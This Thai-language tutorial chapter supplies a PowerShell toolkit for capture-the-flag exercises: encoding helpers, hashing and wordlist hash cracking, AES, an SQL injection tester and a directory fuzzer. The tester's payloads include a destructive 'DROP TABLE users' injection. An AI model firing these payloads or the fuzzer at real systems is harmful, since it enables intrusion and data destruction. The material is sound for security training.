# Part 51: CTF Toolkit

> **ระดับ**: 🔴 Professional/Security | **เวลา**: ~5 ชั่วขนึ่ง

---

## 1. Encoding/Decoding Tools

```powershell
# Swiss Army Knife สำหรับ CTF

# Base64
function ConvertTo-Base64  { param([string]$s) [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($s)) }
function ConvertFrom-Base64 { param([string]$s) [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($s)) }

# Hex
function ConvertTo-Hex {
    param([string]$s)
    ($s.ToCharArray() | ForEach-Object { '{0:x2}' -f [int][char]$_ }) -join ''
}
function ConvertFrom-Hex {
    param([string]$hex)
    $bytes = [byte[]](0..($hex.Length/2-1) | ForEach-Object { [Convert]::ToByte($hex.Substring($_*2,2),16) })
    [Text.Encoding]::UTF8.GetString($bytes)
}

# ROT13
function Invoke-ROT13 {
    param([string]$s)
    $s -creplace '[a-mA-M]',{[char]([int][char]$_.Value+13)} -creplace '[n-zN-Z]',{[char]([int][char]$_.Value-13)}
}

# Caesar cipher
function Invoke-Caesar {
    param([string]$s, [int]$Shift)
    $result = ''
    foreach ($c in $s.ToCharArray()) {
        if ([char]::IsLetter($c)) {
            $base = if ([char]::IsUpper($c)) { [int][char]'A' } else { [int][char]'a' }
            $result += [char](($( [int][char]$c - $base + $Shift) % 26 + $base))
        } else { $result += $c }
    }
    $result
}

# XOR
function Invoke-XOR {
    param([string]$s, [byte]$Key)
    $bytes = [Text.Encoding]::UTF8.GetBytes($s)
    $xored = $bytes | ForEach-Object { $_ -bxor $Key }
    [Text.Encoding]::UTF8.GetString([byte[]]$xored)
}

# URL encode/decode
function ConvertTo-UrlEncode   { param([string]$s) [Uri]::EscapeDataString($s) }
function ConvertFrom-UrlEncode { param([string]$s) [Uri]::UnescapeDataString($s) }

# HTML encode/decode
function ConvertTo-HtmlEncode   { param([string]$s) [System.Web.HttpUtility]::HtmlEncode($s) }
function ConvertFrom-HtmlEncode { param([string]$s) [System.Web.HttpUtility]::HtmlDecode($s) }
```

---

## 2. Crypto Tools

```powershell
# Hash functions
function Get-StringHash {
    param([string]$s, [ValidateSet('MD5','SHA1','SHA256','SHA512')][string]$Algo = 'SHA256')
    $bytes = [Text.Encoding]::UTF8.GetBytes($s)
    $hash  = [System.Security.Cryptography.HashAlgorithm]::Create($Algo)
    $result = $hash.ComputeHash($bytes)
    [BitConverter]::ToString($result) -replace '-',''
}

Get-StringHash 'Hello World'
Get-StringHash 'admin' -Algo MD5     # 21232f297a57a5a743894a0e4a801fc3
Get-StringHash 'admin' -Algo SHA1

# Brute-force hash (CTF)
function Find-HashPreimage {
    param([string]$TargetHash, [string]$Algo = 'MD5', [string[]]$Wordlist)
    foreach ($word in $Wordlist) {
        if ((Get-StringHash $word -Algo $Algo) -eq $TargetHash.ToUpper()) {
            Write-Host "FOUND: '$word'" -ForegroundColor Green
            return $word
        }
    }
    Write-Host 'Not found' -ForegroundColor Red
}

$words = Get-Content 'C:\wordlists\rockyou.txt' -First 1000
Find-HashPreimage '5f4dcc3b5aa765d61d8327deb882cf99' -Algo MD5 -Wordlist $words

# AES encrypt/decrypt (CTF challenge)
function Invoke-AES {
    param(
        [string]$Text,
        [string]$Key,
        [string]$IV,
        [ValidateSet('Encrypt','Decrypt')][string]$Mode = 'Encrypt'
    )
    $aes         = [System.Security.Cryptography.Aes]::Create()
    $aes.Key     = [Text.Encoding]::UTF8.GetBytes($Key.PadRight(32).Substring(0,32))
    $aes.IV      = [Text.Encoding]::UTF8.GetBytes($IV.PadRight(16).Substring(0,16))
    $aes.Mode    = 'CBC'
    $aes.Padding = 'PKCS7'
    
    if ($Mode -eq 'Encrypt') {
        $enc   = $aes.CreateEncryptor()
        $bytes = [Text.Encoding]::UTF8.GetBytes($Text)
        $out   = $enc.TransformFinalBlock($bytes, 0, $bytes.Length)
        [Convert]::ToBase64String($out)
    } else {
        $dec   = $aes.CreateDecryptor()
        $bytes = [Convert]::FromBase64String($Text)
        $out   = $dec.TransformFinalBlock($bytes, 0, $bytes.Length)
        [Text.Encoding]::UTF8.GetString($out)
    }
}

$encrypted = Invoke-AES 'Secret message!' 'MyKey12345678901' 'MyIV567890123456' -Mode Encrypt
$decrypted = Invoke-AES $encrypted 'MyKey12345678901' 'MyIV567890123456' -Mode Decrypt
Write-Host "Encrypted: $encrypted"
Write-Host "Decrypted: $decrypted"
```

---

## 3. Web Challenge Tools

```powershell
# SQL injection tester (authorized only)
function Test-SqlInjection {
    param([string]$Url, [string]$Param, [string]$Value)
    $payloads = @(
        "$Value'",
        "$Value' OR '1'='1",
        "$Value'; DROP TABLE users;--",
        "$Value' UNION SELECT 1,2,3--"
    )
    foreach ($p in $payloads) {
        try {
            $resp = Invoke-WebRequest "$Url?$Param=$([Uri]::EscapeDataString($p))" -TimeoutSec 5 -EA Stop
            [PSCustomObject]@{ Payload=$p; Status=$resp.StatusCode; Length=$resp.Content.Length }
        } catch {
            [PSCustomObject]@{ Payload=$p; Status=$_.Exception.Response.StatusCode; Length=0 }
        }
    }
}

# Directory fuzzer
function Invoke-DirFuzz {
    param([string]$Url, [string[]]$Wordlist)
    $Wordlist | ForEach-Object -Parallel {
        $path = $_
        $base = $using:Url
        try {
            $r = Invoke-WebRequest "$base/$path" -TimeoutSec 3 -EA Stop
            [PSCustomObject]@{ Path=$path; Status=$r.StatusCode; Size=$r.Content.Length }
        } catch {
            $status = $_.Exception.Response.StatusCode
            if ($status -ne 404) {
                [PSCustomObject]@{ Path=$path; Status=[int]$status; Size=0 }
            }
        }
    } -ThrottleLimit 20 | Where-Object Status -ne $null
}

$wordlist = @('admin','login','api','backup','.git','.env','config','db','upload','flag')
Invoke-DirFuzz -Url 'http://ctf-target.local' -Wordlist $wordlist | Format-Table
```

---

**ก่อนหน้า ← [Part 50](Part-50.md) | ต่อไป → [Part 52: PS Internals](Part-52.md)**
